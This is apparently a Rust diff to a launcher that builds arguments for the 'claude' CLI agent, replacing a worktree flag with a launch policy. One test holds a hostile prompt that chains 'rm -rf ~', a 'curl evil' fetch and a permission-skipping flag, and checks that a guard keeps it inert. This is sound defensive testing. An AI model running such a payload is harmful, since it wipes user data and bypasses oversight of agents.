@@ -5,7 +5,7 @@
 use super::{AgentLauncher, argv::LaunchArgv};
 use crate::engines::pending_work::{
     agent::query::get_thread_title,
-    launch::{Worktree, new_launch_prompt},
+    launch::{LaunchPolicy, new_launch_prompt},
     model::Item,
 };
 
@@ -19,10 +19,10 @@ impl AgentLauncher for ClaudeLauncher {
         BINARY
     }
 
-    fn argv(&self, item: &Item, worktree: Worktree) -> Vec<String> {
+    fn argv(&self, item: &Item, policy: LaunchPolicy) -> Vec<String> {
         LaunchArgv::new(BINARY)
             .flag("--name", get_thread_title::handle(item.into()))
-            .into_guarded(new_launch_prompt(item, worktree))
+            .into_guarded(new_launch_prompt(item, policy))
     }
 }
 
@@ -41,7 +41,7 @@ mod tests {
             prompt: "do the thing".to_string(),
             ..Item::default_for_test("PWF-0038", "zellij dispatches")
         };
-        let argv = ClaudeLauncher.argv(&item, Worktree::from(false));
+        let argv = ClaudeLauncher.argv(&item, LaunchPolicy::default());
         assert_eq!(argv[0], "claude");
         assert_eq!(argv[1], "--name");
         assert_eq!(argv[2], "PWF-0038 - zellij dispatches");
@@ -59,7 +59,7 @@ mod tests {
             prompt: "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
             ..Item::default_for_test("PWF-0073", "--dangerously-skip-permissions")
         };
-        let argv = ClaudeLauncher.argv(&item, Worktree::from(false));
+        let argv = ClaudeLauncher.argv(&item, LaunchPolicy::default());
         assert_eq!(argv[0], "claude"); // store can't change WHAT runs
         assert_eq!(argv[3], "--"); // guard present
         // The hostile prompt is exactly one trailing element after the guard.
